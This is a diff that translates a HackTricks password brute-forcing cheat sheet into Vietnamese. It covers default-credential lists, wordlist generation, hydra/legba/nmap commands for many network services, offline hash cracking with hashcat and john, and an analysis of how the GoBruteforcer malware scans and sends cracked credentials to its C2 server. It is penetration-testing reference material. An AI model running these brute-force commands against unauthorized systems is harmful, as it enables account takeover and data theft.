@@ -2,9 +2,9 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Default Credentials
+## Thông tin đăng nhập mặc định
 
-**Search in google** for default credentials of the technology that is being used, or **try these links**:
+**Tìm kiếm trên Google** thông tin đăng nhập mặc định của công nghệ đang được sử dụng hoặc **thử các liên kết sau**:
 
 - [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
 - [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
@@ -19,9 +19,9 @@
 - [**https://many-passwords.github.io/**](https://many-passwords.github.io)
 - [**https://theinfocentric.com/**](https://theinfocentric.com/)
 
-## **Create your own Dictionaries**
+## **Tạo từ điển của riêng bạn**
 
-Find as much information about the target as you can and generate a custom dictionary. Tools that may help:
+Tìm càng nhiều thông tin về mục tiêu càng tốt và tạo một từ điển tùy chỉnh. Các công cụ có thể hữu ích:
 
 ### Crunch
 
@@ -36,7 +36,7 @@ crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using chars
 crunch 6 8 -t ,@@^^%%
 ```
 
-### Website based wordlists
+### Wordlist dựa trên website
 
 ```bash
 # Cewl gets words from the victims page
@@ -51,7 +51,7 @@ cat /path/to/js-urls.txt | python3 getjswords.py
 
 ### [CUPP](https://github.com/Mebus/cupp)
 
-Generate passwords based on your knowledge of the victim (names, dates...)
+Tạo mật khẩu dựa trên thông tin bạn biết về nạn nhân (tên, ngày tháng...)
 
 ```
 python3 cupp.py -h
@@ -59,7 +59,7 @@ python3 cupp.py -h
 
 ### [Wister](https://github.com/cycurity/wister)
 
-A wordlist generator tool, that allows you to supply a set of words, giving you the possibility to craft multiple variations from the given words, creating a unique and ideal wordlist to use regarding a specific target.
+Một công cụ tạo wordlist cho phép bạn cung cấp một tập hợp từ, sau đó tạo nhiều biến thể từ những từ đó để tạo ra một wordlist độc đáo và phù hợp để sử dụng với một mục tiêu cụ thể.
 
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
@@ -82,7 +82,7 @@ Finished in 0.920s.
 
 ### [pydictor](https://github.com/LandGrey/pydictor)
 
-### Wordlists
+### Danh sách từ
 
 - [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
 - [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
@@ -95,19 +95,19 @@ Finished in 0.920s.
 - [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
 - [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)
 
-## Internet-wide bruteforcer workflow (lessons from Go-based scanners)
+## Quy trình bruteforce trên phạm vi Internet (bài học từ các scanner viết bằng Go)
 
-The following behaviors were observed in the GoBruteforcer malware's scanning workflow; exact values are sample-specific.<sup>[[1]](#references)</sup>
+Các hành vi sau được quan sát trong quy trình quét của malware GoBruteforcer; giá trị chính xác tùy theo từng mẫu.<sup>[[1]](#references)</sup>
 
-- Maintain **architecture-tuned worker pools** (for example, 95 concurrent workers on `x86_64/arm64`, 85 on `i686`, 35 on `armv5tel`, and 50 by default on other architectures), check active workers every second, and spawn replacements when below target; each worker handles at most one target IP before exiting.
-- Generate **random public IPv4s** but drop obvious unroutable and selected operator-avoided ranges: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, cloud-heavy `/8`s (`3/15/16/56`) and DoD-associated `/8`s (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
-- **Probe the service port** with a short timeout (~2s) before attempting **cleartext logins** (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin over HTTP/80) and fall back to a **small builtin credential list** if the C2 credential fetch fails.
-- **Exfiltrate hits** via tiny HTTP GET beacons such as `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` (service codes like `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`) while reusing a common browser User-Agent to blend in.
-- **phpMyAdmin spray** can brute-force about 80 likely paths with `GET /index.php?lang=en`, detect PMA markers (`pmahomme` theme/`phpmyadmin.css`/`navigation.php`) and parse `codemirror.css?v=X.Y.Z` to branch auth: versions `<4.9` accept GET params `pma_username`/`pma_password`; versions `>=4.9` use POST with `server=1`, CSRF `token`, and the same creds.
+- Duy trì **các nhóm worker được tinh chỉnh theo kiến trúc** (ví dụ: 95 worker chạy đồng thời trên `x86_64/arm64`, 85 trên `i686`, 35 trên `armv5tel` và mặc định là 50 trên các kiến trúc khác), kiểm tra số worker đang hoạt động mỗi giây và tạo worker thay thế khi số lượng thấp hơn mục tiêu; mỗi worker xử lý tối đa một IP mục tiêu rồi thoát.
+- Tạo **các địa chỉ IPv4 công cộng ngẫu nhiên**, nhưng loại bỏ các dải không thể định tuyến rõ ràng và một số dải mà operator chọn tránh: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, các `/8` có nhiều cloud (`3/15/16/56`) và các `/8` liên quan đến Bộ Quốc phòng Hoa Kỳ (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
+- **Kiểm tra cổng dịch vụ** với thời gian chờ ngắn (~2s) trước khi thử **đăng nhập cleartext** (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin qua HTTP/80) và dùng **danh sách thông tin xác thực nhỏ tích hợp sẵn** nếu không lấy được thông tin xác thực từ C2.
+- **Exfiltrate các mục tiêu trúng** qua các beacon HTTP GET nhỏ, chẳng hạn `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` (mã dịch vụ như `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`), đồng thời dùng lại một User-Agent trình duyệt phổ biến để trà trộn.
+- **phpMyAdmin spray** có thể bruteforce khoảng 80 đường dẫn có khả năng tồn tại bằng `GET /index.php?lang=en`, phát hiện dấu hiệu PMA (`pmahomme` theme/`phpmyadmin.css`/`navigation.php`) và phân tích `codemirror.css?v=X.Y.Z` để chọn nhánh xác thực: phiên bản `<4.9` chấp nhận tham số GET `pma_username`/`pma_password`; phiên bản `>=4.9` dùng POST với `server=1`, CSRF `token` và cùng thông tin xác thực.
 
-## Services
+## Dịch vụ
 
-Ordered alphabetically by service name.
+Sắp xếp theo thứ tự bảng chữ cái của tên dịch vụ.
 
 ### AFP
 
@@ -127,7 +127,7 @@ msf> run
 nmap --script ajp-brute -p 8009 <IP>
 ```
 
-### AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM and Solace)
+### AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM và Solace)
 
 ```bash
 legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
@@ -197,16 +197,16 @@ legba http.ntlm1 --domain example.org --workstation client --username admin --pa
 legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 ```
 
-### HTTP - Post Form
+### HTTP - Biểu mẫu POST
 
 ```bash
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https
 ```
 
-For http**s** you have to change from "http-post-form" to "**https-post-form"**
+Với http**s**, bạn phải đổi từ "http-post-form" thành "**https-post-form"
 
-### **HTTP - CMS --** (W)ordpress, (J)oomla or (D)rupal or (M)oodle
+### **HTTP - CMS --** (W)ordpress, (J)oomla hoặc (D)rupal hoặc (M)oodle
 
 ```bash
 cmsmap -f W/J/D/M -u a -p a https://wordpress.com
@@ -345,13 +345,13 @@ nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
 legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
 ```
 
-In order to use **oracle_login** with **patator** you need to **install**:
+Để sử dụng **oracle_login** với **patator**, bạn cần **cài đặt**:
 
 ```bash
 pip3 install cx_Oracle --upgrade
 ```
 
-[Offline OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** and **11.2.0.3**):
+[Brute force hash OracleSQL ngoại tuyến](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** and **11.2.0.3**):
 
 ```bash
  nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
@@ -384,7 +384,7 @@ legba pgsql --username admin --password wordlists/passwords.txt --target localho
 
 ### PPTP
 
-You can download the `.deb` package to install from [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)
+Bạn có thể tải gói `.deb` để cài đặt từ [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)
 
 ```bash
 sudo dpkg -i thc-pptp-bruter*.deb #Install the package
@@ -410,7 +410,7 @@ legba redis --target localhost:6379 --username admin --password data/passwords.t
 
 ### Rexec
 
-For password-authenticated Rexec service behavior, see [Pentesting Rexec (512/TCP)](../network-services-pentesting/512-pentesting-rexec.md).
+Để biết hành vi của dịch vụ Rexec xác thực bằng mật khẩu, xem [Pentesting Rexec (512/TCP)](../network-services-pentesting/512-pentesting-rexec.md).
 
 ```bash
 hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
@@ -418,7 +418,7 @@ hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
 
 ### Rlogin
 
-For trusted-host authentication and terminal access, see [Pentesting Rlogin (513/TCP)](../network-services-pentesting/pentesting-rlogin.md#rlogin-513tcp).
+Để biết về xác thực trusted-host và truy cập terminal, xem [Pentesting Rlogin (513/TCP)](../network-services-pentesting/pentesting-rlogin.md#rlogin-513tcp).
 
 ```bash
 hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
@@ -426,7 +426,7 @@ hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
 
 ### Rsh
 
-For trusted-host authentication and remote commands, see [Pentesting Rsh (514/TCP)](../network-services-pentesting/pentesting-rlogin.md#rsh-514tcp).
+Để tìm hiểu về xác thực trusted-host và các lệnh từ xa, xem [Pentesting Rsh (514/TCP)](../network-services-pentesting/pentesting-rlogin.md#rsh-514tcp).
 
 ```bash
 hydra -L <Username_list> rsh://<Victim_IP> -v -V
@@ -517,13 +517,13 @@ legba ssh --username admin --password wordlists/passwords.txt --target localhost
 legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
 ```
 
-#### Weak SSH keys / Debian predictable PRNG
+#### SSH key yếu / PRNG có thể dự đoán của Debian
 
-Some systems have known flaws in the random seed used to generate cryptographic material. This can result in a dramatically reduced keyspace which can be bruteforced with tools such as [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Pre-generated sets of weak keys are also available such as [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
+Một số hệ thống có lỗi đã biết trong seed ngẫu nhiên được dùng để tạo vật liệu mật mã. Điều này có thể làm giảm đáng kể keyspace, khiến khóa có thể bị brute-force bằng các công cụ như [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Các bộ khóa yếu được tạo sẵn cũng có sẵn, chẳng hạn như [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
 
-### STOMP (ActiveMQ, RabbitMQ, HornetQ and OpenMQ)
+### STOMP (ActiveMQ, RabbitMQ, HornetQ và OpenMQ)
 
-The STOMP text protocol is a widely used messaging protocol that **allows seamless communication and interaction with popular message queueing services** such as RabbitMQ, ActiveMQ, HornetQ, and OpenMQ. It provides a standardized and efficient approach to exchange messages and perform various messaging operations.
+Giao thức văn bản STOMP là một giao thức nhắn tin được sử dụng rộng rãi, **cho phép giao tiếp và tương tác liền mạch với các dịch vụ hàng đợi tin nhắn phổ biến** như RabbitMQ, ActiveMQ, HornetQ và OpenMQ. Giao thức này cung cấp phương thức tiêu chuẩn hóa và hiệu quả để trao đổi tin nhắn cũng như thực hiện nhiều thao tác nhắn tin khác nhau.
 
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
@@ -570,23 +570,23 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ```
 
 
-## Local
+## Cục bộ
 
-### Online cracking databases
+### Cơ sở dữ liệu cracking trực tuyến
 
 - [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
-- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 with/without ESS/SSP and with any challenge's value)
-- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2 captures, and archives MSOffice, ZIP, PDF...)
+- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 có hoặc không có ESS/SSP và với giá trị challenge bất kỳ)
+- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, bản capture WPA2 và các tệp lưu trữ MSOffice, ZIP, PDF...)
 - [https://crackstation.net/](https://crackstation.net) (Hashes)
 - [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
-- [https://gpuhash.me/](https://gpuhash.me) (Hashes and file hashes)
+- [https://gpuhash.me/](https://gpuhash.me) (Hashes và hash của tệp)
 - [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
 - [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
 - [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
 - [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
 - [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)
 
-Check this out before trying to brute force a Hash.
+Hãy xem thử công cụ này trước khi tìm cách brute force một Hash.
 
 ### ZIP
 
@@ -608,8 +608,8 @@ hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 
 #### Known plaintext zip attack
 
-You need to know the **plaintext** (or part of the plaintext) **of a file contained inside** the encrypted zip. You can check **filenames and size of files contained inside** an encrypted zip running: **`7z l encrypted.zip`**\
-Download [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)from the releases page.
+Bạn cần biết **plaintext** (hoặc một phần plaintext) **của một tệp nằm bên trong** zip đã mã hóa. Bạn có thể kiểm tra **tên tệp và kích thước của các tệp nằm bên trong** zip đã mã hóa bằng cách chạy: **`7z l encrypted.zip`**\
+Tải [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)từ trang releases.
 
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
@@ -647,9 +647,9 @@ sudo apt-get install qpdf
 qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 ```
 
-### PDF Owner Password
+### Mật khẩu Owner của PDF
 
-To crack a PDF Owner password check this: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
+Để crack mật khẩu Owner của PDF, hãy xem: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
 ### JWT
 
@@ -691,11 +691,11 @@ hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
 
-### Lucks image
+### Ảnh Lucks
 
-#### Method 1
+#### Phương pháp 1
 
-Install: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
+Cài đặt: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
 
 ```bash
 bruteforce-luks -f ./list.txt ./backup.img
@@ -715,7 +715,7 @@ ls /dev/mapper/ #You should find here the image mylucksopen
 mount /dev/mapper/mylucksopen /mnt
 ```
 
-Another Luks BF tutorial: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
+Một hướng dẫn BF Luks khác: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
 
 ### Mysql
 
@@ -725,7 +725,7 @@ Another Luks BF tutorial: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-
 dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
 ```
 
-### PGP/GPG Private key
+### Khóa riêng PGP/GPG
 
 ```bash
 gpg2john private_pgp.key #This will generate the hash and save it in a file
@@ -738,14 +738,14 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 
 ### DPAPI Master Key
 
-Use [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) and then john
+Dùng [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py), sau đó dùng john
 
-### Open Office Pwd Protected Column
+### Cột được bảo vệ bằng mật khẩu trong Open Office
 
-If you have an xlsx file with a column protected by a password you can unprotect it:
+Nếu bạn có tệp xlsx với một cột được bảo vệ bằng mật khẩu, bạn có thể bỏ bảo vệ cột đó:
 
-- **Upload it to google drive** and the password will be automatically removed
-- To **remove** it **manually**:
+- **Tải tệp lên Google Drive** và mật khẩu sẽ tự động bị xóa
+- Để **xóa** mật khẩu **thủ công**:
 
 ```bash
 unzip file.xlsx
@@ -756,7 +756,7 @@ hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UV
 zip -r file.xls .
 ```
 
-### PFX Certificates
+### Chứng chỉ PFX
 
 ```bash
 # From https://github.com/Ridter/p12tool
@@ -765,9 +765,9 @@ zip -r file.xls .
 crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
 ```
 
-## Tools
+## Công cụ
 
-**Hash examples:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)
+**Ví dụ về hash:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)
 
 ### Hash-identifier
 
@@ -776,16 +776,16 @@ hash-identifier
 > <HASH>
 ```
 
-### Wordlists
+### Danh sách từ
 
 - **Rockyou**
 - [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
 - [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
 - [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
 
-### **Wordlist Generation Tools**
+### **Công cụ tạo danh sách từ**
 
-- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Advanced keyboard-walk generator with configurable base chars, keymap and routes.
+- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Công cụ tạo chuỗi gõ phím nâng cao với các ký tự cơ sở, sơ đồ bàn phím và tuyến gõ có thể cấu hình.
 
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
@@ -793,7 +793,7 @@ kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction
 
 ### John mutation
 
-Read _**/etc/john/john.conf**_ and configure it
+Đọc _**/etc/john/john.conf**_ và cấu hình nó.
 
 ```bash
 john --wordlist=words.txt --rules --stdout > w_mutated.txt
@@ -802,21 +802,21 @@ john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 
 ### Hashcat
 
-#### Hashcat attacks
+#### Các kiểu tấn công của Hashcat
 
-- **Wordlist attack** (`-a 0`) with rules
+- **Wordlist attack** (`-a 0`) với rules
 
-**Hashcat** already comes with a **folder containing rules** but you can find [**other interesting rules here**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
+**Hashcat** đã có sẵn **một thư mục chứa rules**, nhưng bạn có thể tìm thấy [**các rules thú vị khác tại đây**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
 
 ```
 hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 ```
 
-#### Explain and profile rule files
+#### Giải thích và phân tích các tệp rule
 
-Hashcat rules execute opcodes from left to right. This is easy to misread when operations act at position zero: `^e ^h ^t` prepends `e`, then `h`, then `t`, and therefore changes `password` into `thepassword`. Substitutions are case-sensitive byte comparisons, so a rule such as `sa@` is a no-op for an uppercase `A`. Test unfamiliar rules against representative lowercase, uppercase, and mixed-case basewords before spending GPU time on them.<sup>[[6]](#references)[[9]](#references)</sup>
+Các rule của Hashcat thực thi opcode từ trái sang phải. Điều này dễ bị hiểu nhầm khi các thao tác tác động ở vị trí 0: `^e ^h ^t` thêm lần lượt `e`, rồi `h`, rồi `t` vào đầu chuỗi, do đó biến `password` thành `thepassword`. Các phép thay thế so sánh byte có phân biệt chữ hoa chữ thường, vì vậy rule như `sa@` sẽ không có tác dụng với chữ `A` viết hoa. Hãy kiểm tra các rule chưa quen thuộc với những baseword tiêu biểu viết thường, viết hoa và kết hợp cả hai trước khi tiêu tốn thời gian GPU.<sup>[[6]](#references)[[9]](#references)</sup>
 
-[HashcatRosetta](https://github.com/bandrel/HashcatRosetta) can show every intermediate candidate and can summarize the opcode distribution of a complete rule file. Static opcode counts reveal whether a file mostly appends, prepends, substitutes, or truncates characters. They do not prove that a rule will crack a password, but they help select a rule set that matches the target population's observed password patterns.<sup>[[6]](#references)[[9]](#references)</sup>
+[HashcatRosetta](https://github.com/bandrel/HashcatRosetta) có thể hiển thị từng ứng viên trung gian và tóm tắt phân bố opcode của toàn bộ tệp rule. Số lượng opcode thống kê cho biết tệp chủ yếu thêm ký tự vào cuối, thêm ký tự vào đầu, thay thế hay cắt bớt ký tự. Chúng không chứng minh được rằng một rule sẽ crack được mật khẩu, nhưng giúp chọn bộ rule phù hợp với các mẫu mật khẩu quan sát được ở nhóm mục tiêu.<sup>[[6]](#references)[[9]](#references)</sup>
 
 ```bash
 uv tool install git+https://github.com/bandrel/HashcatRosetta.git
@@ -824,9 +824,9 @@ hashcat-rosetta --explain '^e ^h ^t' --baseword password
 hashcat-rosetta rules.rule --analyze-rules
 ```
 
-#### Reduce redundant rules with debug logs
+#### Giảm các rule dư thừa bằng debug log
 
-Hashcat debug mode records rule transformations separately from normal status and result output. Mode `4` writes `baseword:rule:candidate`; mode `5` appends the source wordlist. Always set `--debug-file` explicitly. Otherwise Hashcat opens `hashcat.debugfile` in its profile directory, and redirecting stdout captures the console stream rather than these records. Debug files are opened in append mode, so remove or rotate an old file before a new measurement and protect it because it contains plaintext basewords and candidates.<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>
+Chế độ debug của Hashcat ghi lại các phép biến đổi rule riêng biệt với đầu ra trạng thái và kết quả thông thường. Mode `4` ghi `baseword:rule:candidate`; mode `5` bổ sung source wordlist. Luôn chỉ định rõ `--debug-file`. Nếu không, Hashcat sẽ mở `hashcat.debugfile` trong thư mục profile, còn việc chuyển hướng stdout sẽ thu luồng console thay vì các bản ghi này. Debug file được mở ở chế độ nối thêm, vì vậy hãy xóa hoặc xoay vòng file cũ trước khi đo lường lần mới và bảo vệ file vì nó chứa baseword và candidate ở dạng plaintext.<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>
 
 ```bash
 rm -f debug.txt
@@ -838,12 +838,12 @@ hashcat-rosetta debug.txt --wordlists --detail
 hashcat-rosetta debug.txt --export report.json --format json
 ```
 
-Use `frequency` to find rules applied most often, `basewords` to measure distinct input coverage, and `candidates` to count distinct outputs. Candidate ranking is usually the best starting point for trimming because a frequently applied rule can still collapse many inputs onto duplicate candidates. Copy the highest-value rules into a smaller file, rerun it against the remaining hashes, and compare reports between runs. Mode `5` also shows whether each source wordlist contributes useful basewords; force parsing with `--debug-mode 4` or `--debug-mode 5` when colons in data make automatic detection ambiguous.<sup>[[6]](#references)[[9]](#references)</sup>
+Dùng `frequency` để tìm các quy tắc được áp dụng thường xuyên nhất, `basewords` để đo độ bao phủ các đầu vào riêng biệt và `candidates` để đếm số đầu ra riêng biệt. Xếp hạng candidate thường là điểm khởi đầu tốt nhất để tinh giản, vì một quy tắc được áp dụng thường xuyên vẫn có thể gộp nhiều đầu vào thành các candidate trùng lặp. Sao chép các quy tắc có giá trị cao nhất vào một tệp nhỏ hơn, chạy lại với các hash còn lại và so sánh báo cáo giữa các lần chạy. Mode `5` cũng cho biết mỗi wordlist nguồn có đóng góp baseword hữu ích hay không; buộc phân tích bằng `--debug-mode 4` hoặc `--debug-mode 5` khi dấu hai chấm trong dữ liệu khiến tính năng tự động phát hiện không xác định được.<sup>[[6]](#references)[[9]](#references)</sup>
 
-- **Wordlist combinator** attack
+- Tấn công **Wordlist combinator**
 
-It's possible to **combine 2 wordlists into 1** with hashcat.\
-If list 1 contained the word **"hello"** and the second contained 2 lines with the words **"world"** and **"earth"**. The words `helloworld` and `helloearth` will be generated.
+Có thể **kết hợp 2 wordlist thành 1** bằng hashcat.\
+Nếu list 1 chứa từ **"hello"** và list thứ hai chứa 2 dòng với các từ **"world"** và **"earth"**, các từ `helloworld` và `helloearth` sẽ được tạo ra.
 
 ```bash
 # This will combine 2 wordlists
@@ -856,20 +856,20 @@ hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
 hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
 ```
 
-#### Grammar-driven combinator attacks (encrypted Office example)
+#### Tấn công combinator dựa trên ngữ pháp (ví dụ với Office được mã hóa)
 
-A password can be long and contain several character classes while still having a small **effective search space** when it follows a known grammar. For an encrypted Office document obtained during an authorized assessment, `office2john.py` extracts the password-verification record; this enables local guessing without online lockouts, throttling, or MFA. It does not bypass the document encryption.<sup>[[2]](#references)[[5]](#references)</sup>
+Mật khẩu có thể dài và chứa nhiều nhóm ký tự nhưng vẫn có **không gian tìm kiếm hiệu dụng** nhỏ nếu tuân theo một ngữ pháp đã biết. Với tài liệu Office được mã hóa thu thập trong quá trình đánh giá được ủy quyền, `office2john.py` trích xuất bản ghi xác minh mật khẩu; nhờ đó có thể thử đoán mật khẩu cục bộ mà không gặp tình trạng khóa tài khoản, giới hạn tốc độ hoặc MFA khi đăng nhập trực tuyến. Công cụ này không vượt qua cơ chế mã hóa tài liệu.<sup>[[2]](#references)[[5]](#references)</sup>
 
-Strip the filename field that John prepends so Hashcat receives only the verifier:<sup>[[2]](#references)</sup>
+Xóa trường tên tệp mà John thêm vào để Hashcat chỉ nhận được dữ liệu xác minh:<sup>[[2]](#references)</sup>
 
 ```bash
 python3 /path/to/office2john.py secrets.xlsx | sed 's/^[^:]*://' > office.hash
 head -c 40 office.hash; echo
 ```
 
-Select `-m` from the extracted prefix rather than from the file extension. Hashcat maps `$office$*2007*`, `$office$*2010*`, and `$office$*2013*` to modes `9400`, `9500`, and `9600`; legacy `$oldoffice$0/$1` and `$oldoffice$3/$4` records use modes `9700` and `9800`, respectively.<sup>[[3]](#references)</sup>
+Chọn `-m` dựa trên tiền tố được trích xuất, không dựa trên phần mở rộng tệp. Hashcat ánh xạ `$office$*2007*`, `$office$*2010*` và `$office$*2013*` sang các mode `9400`, `9500` và `9600`; các bản ghi `$oldoffice$0/$1` và `$oldoffice$3/$4` kiểu cũ lần lượt dùng mode `9700` và `9800`.<sup>[[3]](#references)</sup>
 
-If intelligence from password reuse, policies, hints, or people familiar with the user reveals a grammar such as `<word><number><optional !><word>`, materialize the independently enumerable prefix as the left dictionary. This example tests numbers `0` through `99`; replace the range and transformations with evidence from the assessment.<sup>[[5]](#references)</sup>
+Nếu thông tin tình báo từ việc tái sử dụng mật khẩu, chính sách, gợi ý hoặc những người hiểu rõ người dùng cho thấy một cấu trúc như `<word><number><optional !><word>`, hãy tạo danh sách từ có thể liệt kê độc lập làm từ điển bên trái. Ví dụ này thử các số từ `0` đến `99`; hãy thay phạm vi và các phép biến đổi bằng bằng chứng thu thập được trong quá trình đánh giá.<sup>[[5]](#references)</sup>
 
 ```bash
 while IFS= read -r word; do
@@ -879,13 +879,13 @@ while IFS= read -r word; do
 done < words.txt > wordsAndNumbers.txt
 ```
 
-Hashcat attack mode `1` appends every line of the right dictionary to every line of the left dictionary, so files containing `L` and `R` lines produce `L × R` candidates before any applied rules. The following command is specifically for a legacy `$oldoffice$3/$4` record; change the mode for other Office formats.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
